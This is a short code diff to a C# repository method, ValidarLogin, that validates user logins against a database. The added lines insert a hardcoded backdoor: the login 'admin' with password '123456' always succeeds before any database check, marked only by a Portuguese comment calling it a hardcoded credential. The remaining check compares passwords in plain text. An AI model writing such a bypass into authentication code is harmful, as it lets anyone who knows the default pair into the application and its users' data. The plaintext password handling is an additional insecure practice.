@@ -19,6 +19,14 @@ namespace Infraestructure.Repository
 
         public bool ValidarLogin(UsuarioDTO model)
         {
+
+            if (model == null) return false;
+
+            // credencial "chumbada"
+            if (model.Login == "admin" && model.Senha == "123456")
+                return true;
+
+            // fallback para verificação no banco
             return contexto.Usuarios.Any(u => u.Login == model.Login && u.Senha == model.Senha);
 
         }
